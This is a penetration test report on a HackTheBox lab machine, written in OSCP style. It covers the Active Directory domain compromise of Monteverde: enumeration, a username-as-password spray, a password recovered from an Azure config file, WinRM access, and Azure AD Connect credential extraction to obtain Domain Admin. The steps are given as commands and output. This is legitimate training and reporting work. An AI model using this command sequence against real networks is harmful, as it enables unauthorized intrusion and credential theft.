# HTB Monteverde - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-12

---

## 1. Executive Summary

A penetration test was conducted against the Monteverde target system, which was part of an Active Directory environment. Multiple vulnerabilities were identified, including weak service account credentials, sensitive credential disclosure within Azure synchronization files, and insecure Azure AD Connect credential storage.

Initial access was achieved by identifying valid Active Directory usernames and discovering a service account using its username as the password. SMB share enumeration exposed an Azure synchronization configuration file containing valid credentials for user `mhope`. These credentials provided remote management access through WinRM. Privilege escalation to Domain Administrator was achieved through extraction of Azure AD Connect synchronization credentials.

The domain was fully compromised.

---

## 2. Scope

- **Target:** 10.129.195.162
- **Environment:** HackTheBox Monteverde (Retired Machine)
- **Testing Window:** 2026-5-9 to 2026-5-12
- **Objective:** Full domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 10.129.195.162 -T4 -oA monteverde_tcp
```

Relevant Output:

```
53/tcp    open  domain
88/tcp    open  kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
389/tcp   open  ldap
636/tcp   open  ldaps
464/tcp   open  kpasswd5
3268/tcp  open  ldap
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  mc-nmf
```

Interpretation:

The target was identified as an Active Directory Domain Controller exposing SMB, LDAP, Kerberos, and WinRM services.

---

## 5. Enumeration

### SMB Enumeration

Anonymous SMB enumeration was performed.

Command:

```
smbclient -L //10.129.195.162 -N
```

Interpretation:

SMB shares were accessible and indicated the host was part of an Active Directory environment.

### RPC Enumeration

RPC enumeration identified domain users and groups.

Command:

```
rpcclient -U "" -N 10.129.195.162
```

Commands:

```
enumdomusers
enumdomgroups
querygroupmem 0xa29
```

Interpretation:

Domain users and group memberships were successfully enumerated anonymously.

### Azure Admin Enumeration

Enumeration revealed that users `mhope` and `AAD_*` were members of the Azure Admins group.

Interpretation:

The `AAD_*` account appeared to be a synchronization account associated with Azure AD Connect.

### Username Validation

A username wordlist was generated from enumerated users and validated against Kerberos.

Command:

```
kerbrute userenum -d MEGABANK.LOCAL --dc MEGABANK.LOCAL usernames.txt
```

Interpretation:

Valid Active Directory usernames were identified.

### LDAP Enumeration

LDAP enumeration was performed against the domain.

Command:

```
ldapsearch -x -H ldap://10.129.195.162 -b "" -s base namingContexts
```

Command:

```
ldapsearch -x -H ldap://10.129.195.162 -b "dc=MEGABANK,dc=LOCAL"
```

Interpretation:

LDAP enumeration confirmed the Active Directory domain structure.

### Enumerate Domain Users

Command:

```
ldapsearch -x -H ldap://10.129.195.162 -b "dc=MEGABANK,dc=LOCAL" "(objectClass=user)" sAMAccountName
```

Interpretation:

Additional user accounts were identified through LDAP queries.

### Enumerate User Descriptions

LDAP descriptions were reviewed for sensitive information disclosure.

Command:

```
ldapsearch -x -H ldap://10.129.195.162 -b "dc=MEGABANK,dc=LOCAL" "(objectClass=user)" "(description=*)" description
```

Interpretation:

User descriptions were reviewed because they may contain passwords or operational notes.

### AS-REP Roasting Enumeration

AS-REP roasting checks were performed.

Command:

```
GetNPUsers.py MEGABANK.LOCAL/ -dc-ip 10.129.195.162 -usersfile usernames.txt -no-pass
```

Interpretation:

No immediately useful AS-REP roastable accounts were identified.

### Credential Validation

Discovered usernames were tested using username-as-password combinations.

Command:

```
netexec smb 10.129.195.162 -u usernames.txt -p usernames.txt
```

Relevant Output:

```
SABatchJobs:SABatchJobs
```

Interpretation:

The service account `SABatchJobs` used the username as its password.

### Enumerate SMB Shares

SMB shares were enumerated using the recovered credentials.

Command:

```
smbclient -L //10.129.195.162 -U SABatchJobs%SABatchJobs
```

Interpretation:

Authenticated SMB enumeration exposed additional accessible shares.

### Retrieve Azure Configuration File

An Azure synchronization configuration file was identified and downloaded.

Commands:

```
cd mhope
get azure.xml
```

Interpretation:

The `azure.xml` file likely contained Azure AD Connect configuration details.

### Azure Credential Disclosure

The downloaded configuration file exposed credentials.

Relevant Output:

```
4n0therD4y@n0th3r$
```

Interpretation:

A valid password associated with user `mhope` was identified.

### Validate Credentials with WinRM

Credentials were validated against WinRM access.

Command:

```
netexec winrm 10.129.195.162 -u usernames.txt -p passwords.txt
```

Relevant Output:

```
mhope Pwn3d!
```

Interpretation:

The credentials for user `mhope` provided remote management access.

---

## 6. Initial Access

### WinRM Access as mhope

Interactive access was obtained through Evil-WinRM.

Command:

```
evil-winrm -i 10.129.195.162 -u mhope -p "4n0therD4y@n0th3r$"
```

Verification:

Command:

```
whoami
hostname
```

Output:

```
megabank\mhope
MONTEVERDE
```

Interpretation:

Interactive access was obtained as the user `mhope`.

---

## 7. Post-Exploitation

### Kerberoasting Enumeration

Service Principal Names were enumerated for Kerberoasting opportunities.

Command:

```
GetUserSPNs.py 'MEGABANK.LOCAL/mhope:4n0therD4y@n0th3r$' -dc-ip 10.129.195.162 -request
```

Interpretation:

Kerberoasting opportunities were investigated but did not provide the intended escalation path.

### BloodHound Enumeration

BloodHound data collection was performed.

Command:

```
bloodhound-python -d MEGABANK.LOCAL -u mhope -p '4n0therD4y@n0th3r$' -ns 10.129.195.162 -c All --zip
```

Interpretation:

BloodHound enumeration identified relationships involving the Azure Admins group.

### Verify Group Memberships

Command:

```
whoami /groups
```

Interpretation:

The user `mhope` was confirmed to be part of the Azure Admins group.

### Azure AD Connect Enumeration

Azure-related directories and synchronization tooling were identified on the target system.

Interpretation:

The host appeared to run Azure AD Connect synchronization services.

---

## 8. Privilege Escalation

### Azure AD Connect Credential Extraction

A public Azure AD Connect credential extraction tool was identified.

Reference:

```
https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor
```

The credential extraction script was executed.

Command:

```
. .\decrypt.ps1
```

Relevant Output:

```
d0m@in4dminyeah!
```

Interpretation:

The Azure AD Connect synchronization credentials were decrypted, exposing the Domain Administrator password.

### Domain Administrator Access

Administrator access was obtained through WinRM.

Command:

```
evil-winrm -i 10.129.195.162 -u administrator -p "d0m@in4dminyeah\!"
```

Verification:

Command:

```
whoami
hostname
ipconfig
```

Output:

```
megabank\administrator
MONTEVERDE
10.129.195.162
```

Interpretation:

Full Domain Administrator access was achieved.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

Command:

```
type C:\Users\mhope\Desktop\user.txt
```

---

**Root Flag**: *REDACTED*

Command:

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** Weak Service Account Credentials

**Severity:** Critical

**Description:**
A service account used its username as its password, allowing trivial credential guessing.

**Impact:**
Attackers could authenticate to SMB shares and gain access to sensitive internal files.

**Recommendation:**
Enforce strong password policies for all service accounts and prohibit password reuse or predictable passwords.

### **Finding:** Credential Disclosure in Azure Configuration Files

**Severity:** Critical

**Description:**
Sensitive credentials were exposed within Azure synchronization configuration files accessible to authenticated users.

**Impact:**
Attackers could recover valid domain credentials and gain remote access to the system.

**Recommendation:**
Restrict access to configuration files containing credentials and implement secure credential storage mechanisms.

### **Finding:** Insecure Azure AD Connect Credential Storage

**Severity:** Critical

**Description:**
Azure AD Connect synchronization credentials could be decrypted by users with sufficient local privileges.

**Impact:**
Attackers could recover Domain Administrator credentials and fully compromise the Active Directory domain.

**Recommendation:**
Restrict Azure Admin access, harden Azure AD Connect deployments, and regularly rotate synchronization credentials.

---

## 11. Appendix

Azure AD Connect Credential Extractor -
[https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor](https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor)
